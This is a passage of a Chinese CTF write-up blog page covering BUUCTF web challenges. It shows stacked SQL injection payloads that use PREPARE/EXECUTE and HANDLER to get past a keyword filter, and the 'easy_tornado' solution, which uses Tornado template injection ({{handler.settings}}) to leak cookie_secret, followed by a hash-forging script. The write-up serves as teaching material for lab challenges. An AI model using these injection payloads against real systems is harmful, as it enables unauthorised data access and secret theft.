+PREPARE name from @sql;   //预定义SQL语句
+EXECUTE name;  //执行预定义SQL语句
+(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句</code></pre><p>比如：</p>
+<pre tabindex="0"><code>1&#39;;
+SeT@a=’select * from `FlagHere‘;
+prepare execsql from @a;
+execute execsql;#
+##可以使用16进制绕过</code></pre><p>3）Handler</p>
+<p>但是以上方法在这题失效，因为：</p>
+<blockquote>
+<pre tabindex="0"><code>return preg_match(&#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&#34;,$inject);</code></pre></blockquote>
+<p>可以使用handler查看：</p>
+<blockquote>
+<p>1&rsquo;;</p>
+<p>handler FlagHere open;</p>
+<p>handler FlagHere read first;#</p></blockquote>
+<h3 id="0x1f护网杯-2018easy_tornado" class="heading-element"><span>0x1F.[护网杯 2018]easy_tornado</span>
+  <a href="#0x1f%e6%8a%a4%e7%bd%91%e6%9d%af-2018easy_tornado" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>三个文件：</p>
+<pre tabindex="0"><code>/flag.txt
+/welcome.txt
+/hints.txt</code></pre><pre tabindex="0"><code>/flag.txt
+flag in /fllllllllllllag
+
+/welcome.txt
+render
+
+/hints.txt
+md5(cookie_secret+md5(filename))</code></pre><p>在hints可以看到:</p>
+<blockquote>
+<p>file?filename=/hints.txt&amp;filehash=3c2c74f529451b2c58f5624ce640dfd5</p>
+<p>说明还需要filehash</p></blockquote>
+<blockquote>
+<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p>
+<p>根据之前打开文件的url参数分析这个就是filehash的值 想获得flag只要我们在url中传入/fllllllllllllag文件和filehash 经过这段代码处理的值即可关键就在这cookie_secret这块,得想办法获得cookie_secret</p>
+<p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p>
+<p>通过模板注入方式我们可以构造</p></blockquote>
+<pre tabindex="0"><code>error?msg={{handler.settings}}</code></pre><p>得到:ab4a6b4a-f87f-449d-9016-1cd76c91c474</p>
+<p>然后通过脚本获取hash</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="n">cookie_secret</span> <span class="o">=</span> <span class="s1">&#39;ab4a6b4a-f87f-449d-9016-1cd76c91c474&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;/fllllllllllllag&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">file_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">new_filename</span> <span class="o">=</span> <span class="n">cookie_secret</span> <span class="o">+</span> <span class="n">file_hash</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">new_filename</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span></span></span></code></pre></div><blockquote>
+<p>file?filename=/fllllllllllllag&amp;filehash=add6c325a3930e0b3a30602d131fa9ea</p></blockquote>
+<p>得到flag</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2021-05-03 00:00:00">Updated on 2021-05-03&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/buu-web-0x10-0x1f/" data-title="BUU_WEB刷题_0x10-0x1F" data-hashtags="WEB"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/buu-web-0x10-0x1f/" data-hashtag="WEB"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/buu-web-0x10-0x1f/" data-title="BUU_WEB刷题_0x10-0x1F"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/web/" class="post-tag" title="Tags - WEB">WEB</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/buu-web-0x1-0xf/" class="post-nav-item" rel="prev" title="BUU_WEB刷题_0x01-0x0F"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>BUU_WEB刷题_0x01-0x0F</a><a href="/posts/buu-pwn-0x10-0x1f/" class="post-nav-item" rel="next" title="BUU_PWN刷题_0x10-0x1F">BUU_PWN刷题_0x10-0x1F<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.145.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.17-8212d6fd"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"version":"v0.3.17-8212d6fd"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
